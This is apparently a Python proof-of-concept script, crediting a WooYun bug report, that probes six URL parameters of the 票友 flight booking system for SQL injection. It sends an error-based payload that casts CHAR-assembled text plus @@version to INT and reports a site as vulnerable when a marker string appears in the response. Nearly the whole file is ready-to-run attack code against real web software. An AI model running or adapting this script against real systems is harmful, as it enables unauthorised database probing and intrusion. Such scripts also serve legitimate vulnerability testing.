#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 票友机票预订系统6处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0118867
author: Lucifer
description: multi sqli。
'''
import sys
import requests
import warnings

  

class multi_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['票友机票预订系统6处SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        urls = ["/ser_Hotel/SearchList.aspx?CityCode=1%27",
                "/visa/visa_view.aspx?a=11",
                "/travel/Default.aspx?leixing=11",
                "/hotel/Default.aspx?s=11",
                "/travel/Default.aspx?ecity=%E4%B8%8A%E6%B5%B7&leixing=11",
                "/hotel/Default.aspx?s=11"]
        try:
            noexist = True
            for url in urls:
                vulnurl = self.url + url + "%20AnD%201=CoNvErT(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@version)--"
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"WtFaBcMic" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = multi_sqli(sys.argv[1])
    testVuln.run()